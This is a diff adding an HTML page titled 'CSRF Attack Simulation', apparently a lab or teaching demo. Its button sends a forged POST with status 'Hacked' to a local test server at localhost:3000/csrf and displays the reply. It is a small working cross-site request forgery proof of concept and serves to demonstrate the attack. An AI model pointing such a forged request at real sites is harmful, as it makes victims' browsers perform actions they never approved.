@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Attack Simulation</title>
+</head>
+<body>
+  <h2>CSRF Attack Simulation</h2>
+  <button onclick="performAttack()">Perform CSRF Attack</button>
+
+  <script>
+    function performAttack() {
+      fetch("http://localhost:3000/csrf", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: new URLSearchParams({
+          status: "Hacked"
+        })
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log("Attack result:", data);
+        alert(data);
+      })
+      .catch(error => console.error("Error:", error));
+    }
+  </script>
+</body>
+</html>
